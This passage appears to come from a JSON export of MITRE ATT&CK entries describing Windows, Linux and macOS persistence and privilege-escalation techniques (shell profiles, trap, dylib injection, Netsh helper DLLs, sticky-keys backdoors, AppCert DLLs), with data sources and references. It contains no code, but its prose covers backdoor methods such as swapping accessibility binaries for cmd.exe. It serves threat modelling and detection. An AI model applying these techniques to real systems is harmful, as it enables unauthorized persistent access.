    "technique_description": "<p>Adversaries may establish persistence by executing malicious content triggered by a user’s shell. <!-- raw HTML omitted -->~/.bash_profile<!-- raw HTML omitted --> and <!-- raw HTML omitted -->~/.bashrc<!-- raw HTML omitted --> are shell scripts that contain shell commands. These files are executed in a user’s context when a new shell opens or when a user logs in so that their environment is set correctly.<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->~/.bash_profile<!-- raw HTML omitted --> is executed for login shells and <!-- raw HTML omitted -->~/.bashrc<!-- raw HTML omitted --> is executed for interactive non-login shells. This means that when a user logs in (via username and password) to the console (either locally or remotely via something like SSH), the <!-- raw HTML omitted -->~/.bash_profile<!-- raw HTML omitted --> script is executed before the initial command prompt is returned to the user. After that, every time a new shell is opened, the <!-- raw HTML omitted -->~/.bashrc<!-- raw HTML omitted --> script is executed. This allows users more fine-grained control over when they want certain commands executed. These shell scripts are meant to be written to by the local user to configure their own environment.<!-- raw HTML omitted --><!-- raw HTML omitted -->The macOS Terminal.app is a little different in that it runs a login shell by default each time a new terminal window is opened, thus calling <!-- raw HTML omitted -->~/.bash_profile<!-- raw HTML omitted --> each time instead of <!-- raw HTML omitted -->~/.bashrc<!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may abuse these shell scripts by inserting arbitrary shell commands that may be used to execute other binaries to gain persistence. Every time the user logs in or opens a new shell, the modified ~/.bash_profile and/or ~/.bashrc scripts will be executed.(Citation: amnesia malware)</p>\n",
    "technique_references": [
      {
        "source_name": "amnesia malware",
        "url": "https://researchcenter.paloaltonetworks.com/2017/04/unit42-new-iotlinux-malware-targets-dvrs-forms-botnet/",
        "description": "Claud Xiao, Cong Zheng, Yanhui Jia. (2017, April 6). New IoT/Linux Malware Targets DVRs, Forms Botnet. Retrieved February 19, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--b63a34e8-0a61-4c97-a23b-bf8a2ed812e2",
    "platform": "linux|macos",
    "tid": "T1546.004",
    "technique": ".bash_profile and .bashrc",
    "tactic": "persistence",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring|process-use-of-network",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may establish persistence by executing malicious content triggered by a user’s shell. <!-- raw HTML omitted -->~/.bash_profile<!-- raw HTML omitted --> and <!-- raw HTML omitted -->~/.bashrc<!-- raw HTML omitted --> are shell scripts that contain shell commands. These files are executed in a user’s context when a new shell opens or when a user logs in so that their environment is set correctly.<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->~/.bash_profile<!-- raw HTML omitted --> is executed for login shells and <!-- raw HTML omitted -->~/.bashrc<!-- raw HTML omitted --> is executed for interactive non-login shells. This means that when a user logs in (via username and password) to the console (either locally or remotely via something like SSH), the <!-- raw HTML omitted -->~/.bash_profile<!-- raw HTML omitted --> script is executed before the initial command prompt is returned to the user. After that, every time a new shell is opened, the <!-- raw HTML omitted -->~/.bashrc<!-- raw HTML omitted --> script is executed. This allows users more fine-grained control over when they want certain commands executed. These shell scripts are meant to be written to by the local user to configure their own environment.<!-- raw HTML omitted --><!-- raw HTML omitted -->The macOS Terminal.app is a little different in that it runs a login shell by default each time a new terminal window is opened, thus calling <!-- raw HTML omitted -->~/.bash_profile<!-- raw HTML omitted --> each time instead of <!-- raw HTML omitted -->~/.bashrc<!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may abuse these shell scripts by inserting arbitrary shell commands that may be used to execute other binaries to gain persistence. Every time the user logs in or opens a new shell, the modified ~/.bash_profile and/or ~/.bashrc scripts will be executed.(Citation: amnesia malware)</p>\n",
    "technique_references": [
      {
        "source_name": "amnesia malware",
        "url": "https://researchcenter.paloaltonetworks.com/2017/04/unit42-new-iotlinux-malware-targets-dvrs-forms-botnet/",
        "description": "Claud Xiao, Cong Zheng, Yanhui Jia. (2017, April 6). New IoT/Linux Malware Targets DVRs, Forms Botnet. Retrieved February 19, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--63220765-d418-44de-8fae-694b3912317d",
    "platform": "macos|linux",
    "tid": "T1546.005",
    "technique": "Trap",
    "tactic": "privilege-escalation",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may establish persistence by executing malicious content triggered by an interrupt signal. The <!-- raw HTML omitted -->trap<!-- raw HTML omitted --> command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like <!-- raw HTML omitted -->ctrl+c<!-- raw HTML omitted --> and <!-- raw HTML omitted -->ctrl+d<!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries can use this to register code to be executed when the shell encounters specific interrupts as a persistence mechanism. Trap commands are of the following format <!-- raw HTML omitted -->trap ‘command list’ signals<!-- raw HTML omitted --> where “command list” will be executed when “signals” are received.(Citation: Trap Manual)(Citation: Cyberciti Trap Statements)</p>\n",
    "technique_references": [
      {
        "source_name": "Trap Manual",
        "url": "https://ss64.com/bash/trap.html",
        "description": "ss64. (n.d.). trap. Retrieved May 21, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Cyberciti Trap Statements",
        "url": "https://bash.cyberciti.biz/guide/Trap_statement",
        "description": "Cyberciti. (2016, March 29). Trap statement. Retrieved May 21, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--63220765-d418-44de-8fae-694b3912317d",
    "platform": "macos|linux",
    "tid": "T1546.005",
    "technique": "Trap",
    "tactic": "persistence",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may establish persistence by executing malicious content triggered by an interrupt signal. The <!-- raw HTML omitted -->trap<!-- raw HTML omitted --> command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like <!-- raw HTML omitted -->ctrl+c<!-- raw HTML omitted --> and <!-- raw HTML omitted -->ctrl+d<!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries can use this to register code to be executed when the shell encounters specific interrupts as a persistence mechanism. Trap commands are of the following format <!-- raw HTML omitted -->trap ‘command list’ signals<!-- raw HTML omitted --> where “command list” will be executed when “signals” are received.(Citation: Trap Manual)(Citation: Cyberciti Trap Statements)</p>\n",
    "technique_references": [
      {
        "source_name": "Trap Manual",
        "url": "https://ss64.com/bash/trap.html",
        "description": "ss64. (n.d.). trap. Retrieved May 21, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Cyberciti Trap Statements",
        "url": "https://bash.cyberciti.biz/guide/Trap_statement",
        "description": "Cyberciti. (2016, March 29). Trap statement. Retrieved May 21, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--10ff21b9-5a01-4268-a1b5-3b55015f1847",
    "platform": "macos",
    "tid": "T1546.006",
    "technique": "LC_LOAD_DYLIB Addition",
    "tactic": "privilege-escalation",
    "datasources": "binary-file-metadata|file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries. Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long as adjustments are made to the rest of the fields and dependencies. (Citation: Writing Bad Malware for OSX) There are tools available to perform these changes.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may modify Mach-O binary headers to load and execute malicious dylibs every time the binary is executed. Although any changes will invalidate digital signatures on binaries because the binary is being modified, this can be remediated by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn’t checked at load time. (Citation: Malware Persistence on OS X)</p>\n",
    "technique_references": [
      {
        "source_name": "Writing Bad Malware for OSX",
        "url": "https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf",
        "description": "Patrick Wardle. (2015). Writing Bad @$$ Malware for OS X. Retrieved July 10, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Malware Persistence on OS X",
        "url": "https://www.rsaconference.com/writable/presentations/file_upload/ht-r03-malware-persistence-on-os-x-yosemite_final.pdf",
        "description": "Patrick Wardle. (2015). Malware Persistence on OS X Yosemite. Retrieved July 10, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--10ff21b9-5a01-4268-a1b5-3b55015f1847",
    "platform": "macos",
    "tid": "T1546.006",
    "technique": "LC_LOAD_DYLIB Addition",
    "tactic": "persistence",
    "datasources": "binary-file-metadata|file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries. Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long as adjustments are made to the rest of the fields and dependencies. (Citation: Writing Bad Malware for OSX) There are tools available to perform these changes.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may modify Mach-O binary headers to load and execute malicious dylibs every time the binary is executed. Although any changes will invalidate digital signatures on binaries because the binary is being modified, this can be remediated by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn’t checked at load time. (Citation: Malware Persistence on OS X)</p>\n",
    "technique_references": [
      {
        "source_name": "Writing Bad Malware for OSX",
        "url": "https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf",
        "description": "Patrick Wardle. (2015). Writing Bad @$$ Malware for OS X. Retrieved July 10, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Malware Persistence on OS X",
        "url": "https://www.rsaconference.com/writable/presentations/file_upload/ht-r03-malware-persistence-on-os-x-yosemite_final.pdf",
        "description": "Patrick Wardle. (2015). Malware Persistence on OS X Yosemite. Retrieved July 10, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--f63fe421-b1d1-45c0-b8a7-02cd16ff2bed",
    "platform": "windows",
    "tid": "T1546.007",
    "technique": "Netsh Helper DLL",
    "tactic": "privilege-escalation",
    "datasources": "dll-monitoring|process-command-line-parameters|process-monitoring|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility. (Citation: TechNet Netsh) The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at <!-- raw HTML omitted -->HKLM\\SOFTWARE\\Microsoft\\Netsh<!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner. This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality. (Citation: Github Netsh Helper CS Beacon)(Citation: Demaske Netsh Persistence)</p>\n",
    "technique_references": [
      {
        "source_name": "TechNet Netsh",
        "url": "https://technet.microsoft.com/library/bb490939.aspx",
        "description": "Microsoft. (n.d.). Using Netsh. Retrieved February 13, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Github Netsh Helper CS Beacon",
        "url": "https://github.com/outflankbv/NetshHelperBeacon",
        "description": "Smeets, M. (2016, September 26). NetshHelperBeacon. Retrieved February 13, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Demaske Netsh Persistence",
        "url": "https://htmlpreview.github.io/?https://github.com/MatthewDemaske/blogbackup/blob/master/netshell.html",
        "description": "Demaske, M. (2016, September 23). USING NETSHELL TO EXECUTE EVIL DLLS AND PERSIST ON A HOST. Retrieved April 8, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--f63fe421-b1d1-45c0-b8a7-02cd16ff2bed",
    "platform": "windows",
    "tid": "T1546.007",
    "technique": "Netsh Helper DLL",
    "tactic": "persistence",
    "datasources": "dll-monitoring|process-command-line-parameters|process-monitoring|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility. (Citation: TechNet Netsh) The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at <!-- raw HTML omitted -->HKLM\\SOFTWARE\\Microsoft\\Netsh<!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner. This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality. (Citation: Github Netsh Helper CS Beacon)(Citation: Demaske Netsh Persistence)</p>\n",
    "technique_references": [
      {
        "source_name": "TechNet Netsh",
        "url": "https://technet.microsoft.com/library/bb490939.aspx",
        "description": "Microsoft. (n.d.). Using Netsh. Retrieved February 13, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Github Netsh Helper CS Beacon",
        "url": "https://github.com/outflankbv/NetshHelperBeacon",
        "description": "Smeets, M. (2016, September 26). NetshHelperBeacon. Retrieved February 13, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Demaske Netsh Persistence",
        "url": "https://htmlpreview.github.io/?https://github.com/MatthewDemaske/blogbackup/blob/master/netshell.html",
        "description": "Demaske, M. (2016, September 23). USING NETSHELL TO EXECUTE EVIL DLLS AND PERSIST ON A HOST. Retrieved April 8, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--70e52b04-2a0c-4cea-9d18-7149f1df9dc5",
    "platform": "windows",
    "tid": "T1546.008",
    "technique": "Accessibility Features",
    "tactic": "privilege-escalation",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.<!-- raw HTML omitted --><!-- raw HTML omitted -->Two common accessibility programs are <!-- raw HTML omitted -->C:\\Windows\\System32\\sethc.exe<!-- raw HTML omitted -->, launched when the shift key is pressed five times and <!-- raw HTML omitted -->C:\\Windows\\System32\\utilman.exe<!-- raw HTML omitted -->, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as “sticky keys”, and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit)<!-- raw HTML omitted --><!-- raw HTML omitted -->Depending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <!-- raw HTML omitted -->%systemdir%&lt;/code&gt;, and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The <a href=\"https://attack.mitre.org/techniques/T1546/012\">Image File Execution Options Injection</a> debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.<!-- raw HTML omitted --><!-- raw HTML omitted -->For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <!-- raw HTML omitted -->C:\\Windows\\System32\\utilman.exe<!-- raw HTML omitted -->) may be replaced with “cmd.exe” (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over <a href=\"https://attack.mitre.org/techniques/T1021/001\">Remote Desktop Protocol</a> will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014)<!-- raw HTML omitted --><!-- raw HTML omitted -->Other accessibility features exist that may also be leveraged in a similar fashion: (Citation: DEFCON2016 Sticky Keys)(Citation: Narrator Accessibility Abuse)<!-- raw HTML omitted --><!-- raw HTML omitted -->* On-Screen Keyboard: <!-- raw HTML omitted -->C:\\Windows\\System32\\osk.exe<!-- raw HTML omitted --><!-- raw HTML omitted -->* Magnifier: <!-- raw HTML omitted -->C:\\Windows\\System32\\Magnify.exe<!-- raw HTML omitted --><!-- raw HTML omitted -->* Narrator: <!-- raw HTML omitted -->C:\\Windows\\System32\\Narrator.exe<!-- raw HTML omitted --><!-- raw HTML omitted -->* Display Switcher: <!-- raw HTML omitted -->C:\\Windows\\System32\\DisplaySwitch.exe<!-- raw HTML omitted --><!-- raw HTML omitted -->* App Switcher: <!-- raw HTML omitted -->C:\\Windows\\System32\\AtBroker.exe<!-- raw HTML omitted --></p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/558.html",
        "description": "none",
        "external_id": "CAPEC-558"
      },
      {
        "source_name": "FireEye Hikit Rootkit",
        "url": "https://www.fireeye.com/blog/threat-research/2012/08/hikit-rootkit-advanced-persistent-attack-techniques-part-1.html",
        "description": "Glyer, C., Kazanciyan, R. (2012, August 20). The “Hikit” Rootkit: Advanced and Persistent Attack Techniques (Part 1). Retrieved June 6, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "DEFCON2016 Sticky Keys",
        "url": "https://www.slideshare.net/DennisMaldonado5/sticky-keys-to-the-kingdom",
        "description": "Maldonado, D., McGuffin, T. (2016, August 6). Sticky Keys to the Kingdom. Retrieved July 5, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Tilbury 2014",
        "url": "http://blog.crowdstrike.com/registry-analysis-with-crowdresponse/",
        "description": "Tilbury, C. (2014, August 28). Registry Analysis with CrowdResponse. Retrieved November 12, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Narrator Accessibility Abuse",
        "url": "https://giuliocomi.blogspot.com/2019/10/abusing-windows-10-narrators-feedback.html",
        "description": "Comi, G. (2019, October 19). Abusing Windows 10 Narrator's 'Feedback-Hub' URI for Fileless Persistence. Retrieved April 28, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--70e52b04-2a0c-4cea-9d18-7149f1df9dc5",
    "platform": "windows",
    "tid": "T1546.008",
    "technique": "Accessibility Features",
    "tactic": "persistence",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.<!-- raw HTML omitted --><!-- raw HTML omitted -->Two common accessibility programs are <!-- raw HTML omitted -->C:\\Windows\\System32\\sethc.exe<!-- raw HTML omitted -->, launched when the shift key is pressed five times and <!-- raw HTML omitted -->C:\\Windows\\System32\\utilman.exe<!-- raw HTML omitted -->, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as “sticky keys”, and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit)<!-- raw HTML omitted --><!-- raw HTML omitted -->Depending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <!-- raw HTML omitted -->%systemdir%&lt;/code&gt;, and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The <a href=\"https://attack.mitre.org/techniques/T1546/012\">Image File Execution Options Injection</a> debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.<!-- raw HTML omitted --><!-- raw HTML omitted -->For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <!-- raw HTML omitted -->C:\\Windows\\System32\\utilman.exe<!-- raw HTML omitted -->) may be replaced with “cmd.exe” (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over <a href=\"https://attack.mitre.org/techniques/T1021/001\">Remote Desktop Protocol</a> will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014)<!-- raw HTML omitted --><!-- raw HTML omitted -->Other accessibility features exist that may also be leveraged in a similar fashion: (Citation: DEFCON2016 Sticky Keys)(Citation: Narrator Accessibility Abuse)<!-- raw HTML omitted --><!-- raw HTML omitted -->* On-Screen Keyboard: <!-- raw HTML omitted -->C:\\Windows\\System32\\osk.exe<!-- raw HTML omitted --><!-- raw HTML omitted -->* Magnifier: <!-- raw HTML omitted -->C:\\Windows\\System32\\Magnify.exe<!-- raw HTML omitted --><!-- raw HTML omitted -->* Narrator: <!-- raw HTML omitted -->C:\\Windows\\System32\\Narrator.exe<!-- raw HTML omitted --><!-- raw HTML omitted -->* Display Switcher: <!-- raw HTML omitted -->C:\\Windows\\System32\\DisplaySwitch.exe<!-- raw HTML omitted --><!-- raw HTML omitted -->* App Switcher: <!-- raw HTML omitted -->C:\\Windows\\System32\\AtBroker.exe<!-- raw HTML omitted --></p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/558.html",
        "description": "none",
        "external_id": "CAPEC-558"
      },
      {
        "source_name": "FireEye Hikit Rootkit",
        "url": "https://www.fireeye.com/blog/threat-research/2012/08/hikit-rootkit-advanced-persistent-attack-techniques-part-1.html",
        "description": "Glyer, C., Kazanciyan, R. (2012, August 20). The “Hikit” Rootkit: Advanced and Persistent Attack Techniques (Part 1). Retrieved June 6, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "DEFCON2016 Sticky Keys",
        "url": "https://www.slideshare.net/DennisMaldonado5/sticky-keys-to-the-kingdom",
        "description": "Maldonado, D., McGuffin, T. (2016, August 6). Sticky Keys to the Kingdom. Retrieved July 5, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Tilbury 2014",
        "url": "http://blog.crowdstrike.com/registry-analysis-with-crowdresponse/",
        "description": "Tilbury, C. (2014, August 28). Registry Analysis with CrowdResponse. Retrieved November 12, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Narrator Accessibility Abuse",
        "url": "https://giuliocomi.blogspot.com/2019/10/abusing-windows-10-narrators-feedback.html",
        "description": "Comi, G. (2019, October 19). Abusing Windows 10 Narrator's 'Feedback-Hub' URI for Fileless Persistence. Retrieved April 28, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--7d57b371-10c2-45e5-b3cc-83a8fb380e4c",
    "platform": "windows",
    "tid": "T1546.009",
    "technique": "AppCert DLLs",
    "tactic": "privilege-escalation",
    "datasources": "loaded-dlls|process-command-line-parameters|process-monitoring|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <!-- raw HTML omitted -->AppCertDLLs<!-- raw HTML omitted --> Registry key under <!-- raw HTML omitted -->HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager&lt;/code&gt; are loaded into every process that calls the ubiquitously used application programming interface (API) functions <!-- raw HTML omitted -->CreateProcess<!-- raw HTML omitted -->, <!-- raw HTML omitted -->CreateProcessAsUser<!-- raw HTML omitted -->, <!-- raw HTML omitted -->CreateProcessWithLoginW<!-- raw HTML omitted -->, <!-- raw HTML omitted -->CreateProcessWithTokenW<!-- raw HTML omitted -->, or <!-- raw HTML omitted -->WinExec<!-- raw HTML omitted -->. (Citation: Endgame Process Injection July 2017)<!-- raw HTML omitted --><!-- raw HTML omitted -->Similar to <a href=\"https://attack.mitre.org/techniques/T1055\">Process Injection</a>, this value can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. Malicious AppCert DLLs may also provide persistence by continuously being triggered by API activity.</p>\n",
    "technique_references": [
      {
        "source_name": "Endgame Process Injection July 2017",
        "url": "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
        "description": "Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Sysinternals AppCertDlls Oct 2007",
        "url": "https://forum.sysinternals.com/appcertdlls_topic12546.html",
        "description": "Microsoft. (2007, October 24). Windows Sysinternals - AppCertDlls. Retrieved December 18, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--7d57b371-10c2-45e5-b3cc-83a8fb380e4c",
    "platform": "windows",
    "tid": "T1546.009",
    "technique": "AppCert DLLs",
    "tactic": "persistence",
    "datasources": "loaded-dlls|process-command-line-parameters|process-monitoring|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <!-- raw HTML omitted -->AppCertDLLs<!-- raw HTML omitted --> Registry key under <!-- raw HTML omitted -->HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager&lt;/code&gt; are loaded into every process that calls the ubiquitously used application programming interface (API) functions <!-- raw HTML omitted -->CreateProcess<!-- raw HTML omitted -->, <!-- raw HTML omitted -->CreateProcessAsUser<!-- raw HTML omitted -->, <!-- raw HTML omitted -->CreateProcessWithLoginW<!-- raw HTML omitted -->, <!-- raw HTML omitted -->CreateProcessWithTokenW<!-- raw HTML omitted -->, or <!-- raw HTML omitted -->WinExec<!-- raw HTML omitted -->. (Citation: Endgame Process Injection July 2017)<!-- raw HTML omitted --><!-- raw HTML omitted -->Similar to <a href=\"https://attack.mitre.org/techniques/T1055\">Process Injection</a>, this value can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. Malicious AppCert DLLs may also provide persistence by continuously being triggered by API activity.</p>\n",
    "technique_references": [
      {
        "source_name": "Endgame Process Injection July 2017",
        "url": "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
        "description": "Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Sysinternals AppCertDlls Oct 2007",
        "url": "https://forum.sysinternals.com/appcertdlls_topic12546.html",
        "description": "Microsoft. (2007, October 24). Windows Sysinternals - AppCertDlls. Retrieved December 18, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--cc89ecbd-3d33-4a41-bcca-001e702d18fd",
    "platform": "windows",
    "tid": "T1546.010",
    "technique": "AppInit DLLs",
    "tactic": "privilege-escalation",
    "datasources": "loaded-dlls|process-command-line-parameters|process-monitoring|windows-registry",
